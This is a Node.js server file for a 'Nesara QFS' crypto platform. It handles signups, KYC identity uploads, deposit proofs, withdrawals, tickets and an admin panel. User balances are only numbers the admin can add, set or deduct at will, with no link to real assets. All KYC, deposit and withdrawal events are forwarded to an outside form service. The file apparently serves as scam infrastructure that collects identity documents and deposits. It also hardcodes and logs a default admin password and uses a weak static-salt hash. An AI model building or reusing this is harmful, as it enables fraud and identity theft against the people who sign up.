const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const PORT = process.env.PORT || 3000;
const DATA_DIR = path.join(__dirname, 'data');
const USERS_FILE = path.join(DATA_DIR, 'users.json');
const ADMIN_FILE = path.join(DATA_DIR, 'admin.json');

if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

const ADMIN_DEFAULT_PWD = 'Claude0511@';
const FORMSPREE = 'https://formspree.io/f/mgodlgwb';

const loadUsers = () => {
  if (!fs.existsSync(USERS_FILE)) return {};
  try { return JSON.parse(fs.readFileSync(USERS_FILE, 'utf8')); } catch { return {}; }
};
const saveUsers = (u) => fs.writeFileSync(USERS_FILE, JSON.stringify(u, null, 2));

const loadAdmin = () => {
  if (!fs.existsSync(ADMIN_FILE)) return { passwordHash: hash(ADMIN_DEFAULT_PWD) };
  try { return JSON.parse(fs.readFileSync(ADMIN_FILE, 'utf8')); } catch { return { passwordHash: hash(ADMIN_DEFAULT_PWD) }; }
};
const saveAdmin = (a) => fs.writeFileSync(ADMIN_FILE, JSON.stringify(a, null, 2));

const hash = (s) => crypto.createHash('sha256').update(s + 'nqfs_v8_salt').digest('hex');
const tok = () => crypto.randomBytes(24).toString('hex');

let users = loadUsers();
let admin = loadAdmin();
let userSessions = {};
let adminSessions = {};

const sendEmail = (subject, msg) => {
  fetch(FORMSPREE, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ _subject: subject, action: subject, details: msg, time: new Date().toISOString() })
  }).catch(() => {});
};

const parseBody = (req) => new Promise(res => {
  let b = '';
  req.on('data', c => { b += c; if (b.length > 30e6) req.destroy(); });
  req.on('end', () => { try { res(JSON.parse(b)); } catch { res({}); } });
});

const j = (res, code, data) => {
  res.writeHead(code, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify(data));
};

const send = (res, code, body, type='text/plain') => {
  res.writeHead(code, { 'Content-Type': type });
  res.end(body);
};

const handler = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type,Authorization');
  if (req.method === 'OPTIONS') { res.writeHead(200); res.end(); return; }

  // Static files
  const serveFile = (file, ct='text/html; charset=utf-8') => {
    const p = path.join(__dirname, 'public', file);
    if (fs.existsSync(p)) { res.writeHead(200, { 'Content-Type': ct }); res.end(fs.readFileSync(p)); }
    else send(res, 404, file + ' not found');
  };

  if (req.method === 'GET' && (req.url === '/' || req.url === '/index.html')) return serveFile('index.html');
  if (req.method === 'GET' && (req.url === '/admin' || req.url === '/admin.html')) return serveFile('admin.html');
  if (req.method === 'GET' && req.url === '/favicon.svg') return serveFile('favicon.svg', 'image/svg+xml');

  // ─── USER AUTH ───
  if (req.method === 'POST' && req.url === '/api/register') {
    const b = await parseBody(req);
    if (!b.name || !b.email || !b.password) return j(res, 400, { error: 'All fields required' });
    if (b.password.length < 6) return j(res, 400, { error: 'Password too short' });
    const exists = Object.values(users).find(u => u.email.toLowerCase() === b.email.toLowerCase());
    if (exists) return j(res, 400, { error: 'Email already registered' });
    const id = 'u_' + Date.now();
    const newUser = {
      id, name: b.name, email: b.email.toLowerCase(),
      passwordHash: hash(b.password),
      balances: { XLM: 0, XRP: 0, USDC: 0, BTC: 0 },
      kycStatus: 'unverified',
      depositProofs: [],
      withdrawals: [],
      tickets: [],
      transactions: [],
      createdAt: new Date().toISOString()
    };
    users[id] = newUser;
    saveUsers(users);
    sendEmail(`New Signup — ${b.name}`, `Name: ${b.name}\nEmail: ${b.email}\nTime: ${new Date().toLocaleString()}`);
    const t = tok();
    userSessions[t] = id;
    return j(res, 200, { token: t, user: stripUser(newUser) });
  }

  if (req.method === 'POST' && req.url === '/api/login') {
    const b = await parseBody(req);
    const u = Object.values(users).find(x => x.email.toLowerCase() === (b.email||'').toLowerCase());
    if (!u || u.passwordHash !== hash(b.password||'')) return j(res, 401, { error: 'Invalid email or password' });
    const t = tok();
    userSessions[t] = u.id;
    return j(res, 200, { token: t, user: stripUser(u) });
  }

  if (req.method === 'POST' && req.url === '/api/logout') {
    const t = (req.headers.authorization||'').replace('Bearer ','');
    delete userSessions[t];
    return j(res, 200, { success: true });
  }

  // ─── USER ENDPOINTS (require auth) ───
  const userToken = (req.headers.authorization||'').replace('Bearer ','');
  const userId = userSessions[userToken];
  const user = userId ? users[userId] : null;

  if (req.url.startsWith('/api/') && !req.url.startsWith('/api/admin') && req.url !== '/api/login' && req.url !== '/api/register' && req.url !== '/api/logout') {
    if (!user) return j(res, 401, { error: 'Unauthorized' });

    if (req.method === 'GET' && req.url === '/api/me') return j(res, 200, { user: stripUser(user) });
    if (req.method === 'GET' && req.url === '/api/balances') return j(res, 200, { balances: user.balances });
    if (req.method === 'GET' && req.url === '/api/transactions') return j(res, 200, { transactions: user.transactions || [] });
    if (req.method === 'GET' && req.url === '/api/kyc/status') return j(res, 200, { status: user.kycStatus, docType: user.kycDocType });
    if (req.method === 'GET' && req.url === '/api/deposit-proofs') return j(res, 200, { proofs: user.depositProofs || [] });
    if (req.method === 'GET' && req.url === '/api/withdrawals') return j(res, 200, { withdrawals: user.withdrawals || [] });
    if (req.method === 'GET' && req.url === '/api/tickets') return j(res, 200, { tickets: user.tickets || [] });

    if (req.method === 'POST' && req.url === '/api/kyc/submit') {
      const b = await parseBody(req);
      user.kycStatus = 'pending';
      user.kycDocType = b.docType || 'passport';
      user.kycFullName = b.fullName || user.name;
      user.kycDob = b.dob || '';
      user.kycFileData = b.fileData || null;
      user.kycSubmittedAt = new Date().toISOString();
      saveUsers(users);
      sendEmail(`KYC Submitted — ${user.name}`, `User: ${user.name}\nEmail: ${user.email}\nDoc: ${b.docType}\nName on doc: ${b.fullName||''}\nDOB: ${b.dob||''}`);
      return j(res, 200, { success: true });
    }

    if (req.method === 'POST' && req.url === '/api/deposit-proof') {
      const b = await parseBody(req);
      if (!user.depositProofs) user.depositProofs = [];
      const proof = { id: 'dp_'+Date.now(), coin: b.coin, amount: parseFloat(b.amount)||0, txhash: b.txhash||'', screenshot: b.screenshot||null, status: 'pending', submittedAt: new Date().toISOString() };
      user.depositProofs.push(proof);
      saveUsers(users);
      sendEmail(`Deposit Proof — ${user.name}`, `User: ${user.name}\nEmail: ${user.email}\nCoin: ${b.coin}\nAmount: ${b.amount}\nTx: ${b.txhash}`);
      return j(res, 200, { success: true, proof });
    }

    if (req.method === 'POST' && req.url === '/api/withdrawal') {
      const b = await parseBody(req);
      if (!user.withdrawals) user.withdrawals = [];
      const w = { id: 'wd_'+Date.now(), coin: b.coin, amount: parseFloat(b.amount)||0, address: b.address, note: b.note||'', status: 'pending', submittedAt: new Date().toISOString() };
      user.withdrawals.push(w);
      saveUsers(users);
      sendEmail(`Withdrawal — ${user.name}`, `User: ${user.name}\nEmail: ${user.email}\nCoin: ${b.coin}\nAmount: ${b.amount}\nAddress: ${b.address}`);
      return j(res, 200, { success: true, withdrawal: w });
    }

    if (req.method === 'POST' && req.url === '/api/ticket') {
      const b = await parseBody(req);
      if (!user.tickets) user.tickets = [];
      const t = { 
        id: 'tkt_'+Date.now(), 
        subject: b.subject, 
        status: 'open', 
        createdAt: new Date().toISOString(),
        messages: [{ from: 'user', author: user.name, text: b.message, at: new Date().toISOString() }]
      };
      user.tickets.push(t);
      saveUsers(users);
      sendEmail(`Ticket — ${b.subject}`, `From: ${user.name}\nEmail: ${user.email}\nSubject: ${b.subject}\nMessage: ${b.message}`);
      return j(res, 200, { success: true, ticket: t });
    }

    if (req.method === 'POST' && req.url === '/api/ticket-reply') {
      const b = await parseBody(req);
      const t = (user.tickets||[]).find(x => x.id === b.ticketId);
      if (!t) return j(res, 404, { error: 'Ticket not found' });
      if (!t.messages) t.messages = [];
      t.messages.push({ from: 'user', author: user.name, text: b.message, at: new Date().toISOString() });
      t.status = 'open';
      saveUsers(users);
      sendEmail(`Ticket Reply — ${user.name}`, `User: ${user.name}\nTicket: ${t.subject}\nMessage: ${b.message}`);
      return j(res, 200, { success: true, ticket: t });
    }

    if (req.method === 'POST' && req.url === '/api/update-profile') {
      const b = await parseBody(req);
      if (b.name) user.name = b.name;
      saveUsers(users);
      return j(res, 200, { success: true, user: stripUser(user) });
    }

    if (req.method === 'POST' && req.url === '/api/change-password') {
      const b = await parseBody(req);
      if (user.passwordHash !== hash(b.currentPassword||'')) return j(res, 400, { error: 'Wrong current password' });
      if (!b.newPassword || b.newPassword.length < 6) return j(res, 400, { error: 'New password too short' });
      user.passwordHash = hash(b.newPassword);
      saveUsers(users);
      return j(res, 200, { success: true });
    }
  }

  // ─── ADMIN AUTH ───
  if (req.method === 'POST' && req.url === '/api/admin/login') {
    const b = await parseBody(req);
    if (hash(b.password||'') !== admin.passwordHash) return j(res, 401, { error: 'Wrong password' });
    const t = tok();
    adminSessions[t] = true;
    return j(res, 200, { token: t });
  }

  if (req.method === 'POST' && req.url === '/api/admin/logout') {
    const t = (req.headers.authorization||'').replace('Bearer ','');
    delete adminSessions[t];
    return j(res, 200, { success: true });
  }

  // ─── ADMIN ENDPOINTS (require admin auth) ───
  const adminToken = (req.headers.authorization||'').replace('Bearer ','');
  const isAdmin = adminSessions[adminToken];

  if (req.url.startsWith('/api/admin/')) {
    if (!isAdmin) return j(res, 401, { error: 'Admin auth required' });

    if (req.method === 'GET' && req.url === '/api/admin/dashboard') {
      const list = Object.values(users);
      const kycPending = list.filter(u => u.kycStatus === 'pending').length;
      const kycVerified = list.filter(u => u.kycStatus === 'verified').length;
      let proofsPending = 0, wdPending = 0, ticketsOpen = 0;
      list.forEach(u => {
        (u.depositProofs||[]).forEach(p => { if (p.status==='pending') proofsPending++; });
        (u.withdrawals||[]).forEach(w => { if (w.status==='pending') wdPending++; });
        (u.tickets||[]).forEach(t => { if (t.status==='open') ticketsOpen++; });
      });
      return j(res, 200, {
        totalUsers: list.length, kycPending, kycVerified, proofsPending, wdPending, ticketsOpen,
        recentSignups: list.sort((a,b)=>new Date(b.createdAt)-new Date(a.createdAt)).slice(0,10).map(stripUser)
      });
    }

    if (req.method === 'GET' && req.url === '/api/admin/users') {
      return j(res, 200, { users: Object.values(users).map(stripUser) });
    }

    if (req.method === 'GET' && req.url.startsWith('/api/admin/user/')) {
      const id = req.url.split('/').pop();
      const u = users[id];
      if (!u) return j(res, 404, { error: 'User not found' });
      // Return full user including KYC file
      const { passwordHash, ...full } = u;
      return j(res, 200, { user: full });
    }

    if (req.method === 'GET' && req.url.startsWith('/api/admin/kyc-detail/')) {
      const id = req.url.split('/').pop();
      const u = users[id];
      if (!u) return j(res, 404, { error: 'User not found' });
      return j(res, 200, {
        id: u.id, name: u.name, email: u.email,
        kycStatus: u.kycStatus, kycDocType: u.kycDocType,
        kycFullName: u.kycFullName, kycDob: u.kycDob,
        kycSubmittedAt: u.kycSubmittedAt,
        kycFileData: u.kycFileData || null
      });
    }

    if (req.method === 'GET' && req.url.startsWith('/api/admin/proof-detail/')) {
      const parts = req.url.split('/');
      const proofId = parts.pop();
      const userId = parts.pop();
      const u = users[userId];
      if (!u) return j(res, 404, { error: 'User not found' });
      const p = (u.depositProofs||[]).find(x => x.id === proofId);
      if (!p) return j(res, 404, { error: 'Proof not found' });
      return j(res, 200, { proof: { ...p, userName: u.name, userEmail: u.email } });
    }

    if (req.method === 'GET' && req.url === '/api/admin/kyc-list') {
      const list = Object.values(users).filter(u => u.kycStatus && u.kycStatus !== 'unverified').map(u => ({
        id: u.id, name: u.name, email: u.email,
        kycStatus: u.kycStatus, kycDocType: u.kycDocType,
        kycFullName: u.kycFullName, kycDob: u.kycDob,
        kycSubmittedAt: u.kycSubmittedAt
      }));
      return j(res, 200, { kyc: list });
    }

    if (req.method === 'POST' && req.url === '/api/admin/kyc-approve') {
      const b = await parseBody(req);
      const u = users[b.userId];
      if (!u) return j(res, 404, { error: 'User not found' });
      u.kycStatus = 'verified';
      saveUsers(users);
      sendEmail(`KYC Approved — ${u.name}`, `KYC for ${u.name} (${u.email}) approved by admin`);
      return j(res, 200, { success: true });
    }

    if (req.method === 'POST' && req.url === '/api/admin/kyc-reject') {
      const b = await parseBody(req);
      const u = users[b.userId];
      if (!u) return j(res, 404, { error: 'User not found' });
      u.kycStatus = 'rejected';
      saveUsers(users);
      sendEmail(`KYC Rejected — ${u.name}`, `KYC for ${u.name} (${u.email}) rejected by admin`);
      return j(res, 200, { success: true });
    }

    if (req.method === 'GET' && req.url === '/api/admin/proofs') {
      const proofs = [];
      Object.values(users).forEach(u => (u.depositProofs||[]).forEach(p => proofs.push({...p, userId: u.id, userName: u.name, userEmail: u.email})));
      proofs.sort((a,b)=>new Date(b.submittedAt)-new Date(a.submittedAt));
      return j(res, 200, { proofs });
    }

    if (req.method === 'POST' && req.url === '/api/admin/proof-approve') {
      const b = await parseBody(req);
      const u = users[b.userId];
      if (!u) return j(res, 404, { error: 'User not found' });
      const p = (u.depositProofs||[]).find(x => x.id === b.proofId);
      if (!p) return j(res, 404, { error: 'Proof not found' });
      if (p.status !== 'pending') return j(res, 400, { error: 'Already processed' });
      p.status = 'approved';
      if (!u.balances) u.balances = { XLM:0,XRP:0,USDC:0,BTC:0 };
      u.balances[p.coin] = (u.balances[p.coin]||0) + parseFloat(p.amount);
      if (!u.transactions) u.transactions = [];
      u.transactions.unshift({ id:'tx_'+Date.now(), type:'Deposit Credit', coin:p.coin, amount:p.amount, date: new Date().toISOString() });
      saveUsers(users);
      sendEmail(`Deposit Approved — ${u.name}`, `${p.amount} ${p.coin} credited to ${u.name} (${u.email})`);
      return j(res, 200, { success: true });
    }

    if (req.method === 'POST' && req.url === '/api/admin/proof-reject') {
      const b = await parseBody(req);
      const u = users[b.userId];
      if (!u) return j(res, 404, { error: 'User not found' });
      const p = (u.depositProofs||[]).find(x => x.id === b.proofId);
      if (!p) return j(res, 404, { error: 'Proof not found' });
      if (p.status !== 'pending') return j(res, 400, { error: 'Already processed' });
      p.status = 'rejected';
      saveUsers(users);
      return j(res, 200, { success: true });
    }

    if (req.method === 'GET' && req.url === '/api/admin/withdrawals') {
      const wds = [];
      Object.values(users).forEach(u => (u.withdrawals||[]).forEach(w => wds.push({...w, userId: u.id, userName: u.name, userEmail: u.email})));
      wds.sort((a,b)=>new Date(b.submittedAt)-new Date(a.submittedAt));
      return j(res, 200, { withdrawals: wds });
    }

    if (req.method === 'POST' && req.url === '/api/admin/withdrawal-approve') {
      const b = await parseBody(req);
      const u = users[b.userId];
      if (!u) return j(res, 404, { error: 'User not found' });
      const w = (u.withdrawals||[]).find(x => x.id === b.wdId);
      if (!w) return j(res, 404, { error: 'Withdrawal not found' });
      if (w.status !== 'pending') return j(res, 400, { error: 'Already processed' });
      w.status = 'approved';
      if (!u.balances) u.balances = { XLM:0,XRP:0,USDC:0,BTC:0 };
      u.balances[w.coin] = Math.max(0, (u.balances[w.coin]||0) - parseFloat(w.amount));
      if (!u.transactions) u.transactions = [];
      u.transactions.unshift({ id:'tx_'+Date.now(), type:'Withdrawal', coin:w.coin, amount:w.amount, date: new Date().toISOString() });
      saveUsers(users);
      sendEmail(`Withdrawal Approved — ${u.name}`, `${w.amount} ${w.coin} sent to ${w.address}`);
      return j(res, 200, { success: true });
    }

    if (req.method === 'POST' && req.url === '/api/admin/withdrawal-reject') {
      const b = await parseBody(req);
      const u = users[b.userId];
      if (!u) return j(res, 404, { error: 'User not found' });
      const w = (u.withdrawals||[]).find(x => x.id === b.wdId);
      if (!w) return j(res, 404, { error: 'Withdrawal not found' });
      if (w.status !== 'pending') return j(res, 400, { error: 'Already processed' });
      w.status = 'rejected';
      saveUsers(users);
      return j(res, 200, { success: true });
    }

    if (req.method === 'GET' && req.url === '/api/admin/tickets') {
      const tickets = [];
      Object.values(users).forEach(u => (u.tickets||[]).forEach(t => tickets.push({...t, userId: u.id, userName: u.name, userEmail: u.email})));
      tickets.sort((a,b)=>new Date(b.createdAt)-new Date(a.createdAt));
      return j(res, 200, { tickets });
    }

    if (req.method === 'POST' && req.url === '/api/admin/ticket-resolve') {
      const b = await parseBody(req);
      const u = users[b.userId];
      if (!u) return j(res, 404, { error: 'User not found' });
      const t = (u.tickets||[]).find(x => x.id === b.ticketId);
      if (!t) return j(res, 404, { error: 'Ticket not found' });
      t.status = 'resolved';
      saveUsers(users);
      return j(res, 200, { success: true });
    }

    if (req.method === 'POST' && req.url === '/api/admin/ticket-reply') {
      const b = await parseBody(req);
      const u = users[b.userId];
      if (!u) return j(res, 404, { error: 'User not found' });
      const t = (u.tickets||[]).find(x => x.id === b.ticketId);
      if (!t) return j(res, 404, { error: 'Ticket not found' });
      if (!t.messages) t.messages = [];
      t.messages.push({ from: 'admin', author: 'Admin', text: b.message, at: new Date().toISOString() });
      t.status = 'open';
      saveUsers(users);
      sendEmail(`Admin Reply to ${u.name}`, `Ticket: ${t.subject}\nReply: ${b.message}\nUser email: ${u.email}`);
      return j(res, 200, { success: true });
    }

    if (req.method === 'POST' && req.url === '/api/admin/funds') {
      const b = await parseBody(req);
      const u = users[b.userId];
      if (!u) return j(res, 404, { error: 'User not found' });
      if (!u.balances) u.balances = { XLM:0,XRP:0,USDC:0,BTC:0 };
      const amt = parseFloat(b.amount)||0;
      if (b.action === 'add') u.balances[b.coin] = (u.balances[b.coin]||0) + amt;
      else if (b.action === 'set') u.balances[b.coin] = amt;
      else if (b.action === 'deduct') u.balances[b.coin] = Math.max(0, (u.balances[b.coin]||0) - amt);
      if (!u.transactions) u.transactions = [];
      u.transactions.unshift({ id:'tx_'+Date.now(), type:`Admin ${b.action}`, coin:b.coin, amount:amt, date: new Date().toISOString() });
      saveUsers(users);
      sendEmail(`Balance Updated — ${u.name}`, `Admin ${b.action} ${amt} ${b.coin} for ${u.name} (${u.email})`);
      return j(res, 200, { success: true, balances: u.balances });
    }

    if (req.method === 'POST' && req.url === '/api/admin/delete-user') {
      const b = await parseBody(req);
      delete users[b.userId];
      saveUsers(users);
      return j(res, 200, { success: true });
    }

    if (req.method === 'POST' && req.url === '/api/admin/change-password') {
      const b = await parseBody(req);
      if (hash(b.currentPassword||'') !== admin.passwordHash) return j(res, 400, { error: 'Wrong current password' });
      if (!b.newPassword || b.newPassword.length < 6) return j(res, 400, { error: 'New password too short' });
      admin.passwordHash = hash(b.newPassword);
      saveAdmin(admin);
      return j(res, 200, { success: true });
    }
  }

  send(res, 404, 'Not found');
};

function stripUser(u) {
  if (!u) return null;
  const { passwordHash, ...rest } = u;
  return rest;
}

http.createServer(handler).listen(PORT, () => {
  console.log(`✓ Nesara QFS Server v8 running on port ${PORT}`);
  console.log(`✓ Data: ${USERS_FILE}`);
  console.log(`✓ Admin password: ${ADMIN_DEFAULT_PWD} (change in admin settings)`);
});
